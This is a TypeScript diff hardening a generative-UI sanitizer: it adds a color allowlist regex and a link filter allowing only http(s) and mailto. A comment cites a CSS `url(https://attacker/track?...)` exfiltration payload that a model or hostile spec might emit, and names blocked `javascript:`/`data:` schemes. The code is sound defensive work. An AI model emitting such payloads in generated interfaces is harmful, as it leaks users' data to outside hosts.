@@ -82,6 +82,34 @@ function str(v: unknown, cap: number): string | undefined {
   return typeof v === 'string' ? v.slice(0, cap) : undefined
 }
 
+/**
+ * Color field: the value lands in an inline `style` (background/stroke) or
+ * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
+ * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
+ * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
+ * functions, and host design tokens (`var(--dsw-*)`). Anything else degrades
+ * to the component's default palette.
+ */
+const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--dsw-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/
+
+function color(v: unknown): string | undefined {
+  if (typeof v !== 'string') return undefined
+  const s = v.trim()
+  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
+}
+
+/**
+ * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
+ * and every other scheme degrade to a plain-text node — the model's link is
+ * display, not an execution channel.
+ */
+function safeHref(v: unknown): string | undefined {
+  if (typeof v !== 'string') return undefined
+  const s = v.trim()
+  if (s.length > 2048) return undefined
+  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
+}
+
 /** Finite-number field: clamp into [min, max], or undefined when not finite. */
 function num(v: unknown, min: number, max: number): number | undefined {
   return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
@@ -191,7 +219,13 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'select': {
       const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
       if (options === undefined) return null
-      return { type: 'select', options, ...opt('label', str(v.label, GENUI_LIMITS.maxString)), ...opt('action', str(v.action, 200)) }
+      return {
+        type: 'select', options,
+        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
+        ...opt('action', str(v.action, 200)),
+        ...opt('selected', int(v.selected, 0, options.length - 1)),
+        ...opt('id', str(v.id, 200)),
+      }
     }
     case 'checkbox': {
       const label = str(v.label, GENUI_LIMITS.maxString)
@@ -201,7 +235,7 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'link': {
       const label = str(v.label, GENUI_LIMITS.maxString)
       if (label === undefined) return null
-      return { type: 'link', label }
+      return { type: 'link', label, ...opt('href', safeHref(v.href)) }
     }
     case 'badge': {
       const label = str(v.label, GENUI_LIMITS.maxString)
@@ -224,7 +258,7 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'avatar': {
       const name = str(v.name, 64)
       if (name === undefined) return null
-      return { type: 'avatar', name, ...opt('color', str(v.color, 32)) }
+      return { type: 'avatar', name, ...opt('color', color(v.color)) }
     }
     case 'list': {
       const items = repairListItems(v.items, GENUI_LIMITS.maxListItems)
@@ -361,7 +395,7 @@ function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | 
     case 'scene3d': {
       const meshes = repairMeshes(v.meshes)
       if (meshes === undefined) return null
-      return { type: 'scene3d', meshes, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('ambient', num(v.ambient, 0, 2)), ...opt('background', str(v.background, 32)) }
+      return { type: 'scene3d', meshes, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('ambient', num(v.ambient, 0, 2)), ...opt('background', color(v.background)) }
     }
     case 'timeline': {
       const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems)
@@ -451,7 +485,7 @@ function repairChartData(v: unknown, cap: number): Array<{ label: string; value:
     const label = o === undefined ? undefined : str(o.label, 128)
     const value = o === undefined ? undefined : num(o.value, -1e12, 1e12)
     if (label === undefined || value === undefined) continue
-    out.push({ label, value, ...opt('color', o === undefined ? undefined : str(o.color, 32)) })
+    out.push({ label, value, ...opt('color', o === undefined ? undefined : color(o.color)) })
   }
   return out
 }
@@ -465,7 +499,7 @@ function repairSeries(v: unknown, cap: number, pointCap: number): Array<{ label:
     const label = o === undefined ? undefined : str(o.label, 128)
     const data = o === undefined ? undefined : repairChartData(o.data, pointCap)
     if (label === undefined || data === undefined) continue
-    out.push({ label, data, ...opt('color', o === undefined ? undefined : str(o.color, 32)) })
+    out.push({ label, data, ...opt('color', o === undefined ? undefined : color(o.color)) })
   }
   return out
 }
@@ -510,7 +544,7 @@ function repairPlotSeries(v: unknown, cap: number): GenuiPlot['series'] | undefi
         })
       }
     }
-    out.push({ expr, ...opt('label', str(o.label, 128)), ...opt('color', str(o.color, 32)), ...opt('params', params.length > 0 ? params : undefined) })
+    out.push({ expr, ...opt('label', str(o.label, 128)), ...opt('color', color(o.color)), ...opt('params', params.length > 0 ? params : undefined) })
   }
   return out
 }
@@ -582,7 +616,7 @@ function repairMeshes(v: unknown): GenuiScene3D['meshes'] | undefined {
     const size = o === undefined ? undefined : num(o.size, -1e6, 1e6) ?? tuple3(o.size)
     out.push({
       shape,
-      ...opt('color', o === undefined ? undefined : str(o.color, 32)),
+      ...opt('color', o === undefined ? undefined : color(o.color)),
       ...opt('position', o === undefined ? undefined : tuple3(o.position)),
       ...opt('rotation', o === undefined ? undefined : tuple3(o.rotation)),
       ...opt('scale', scale),
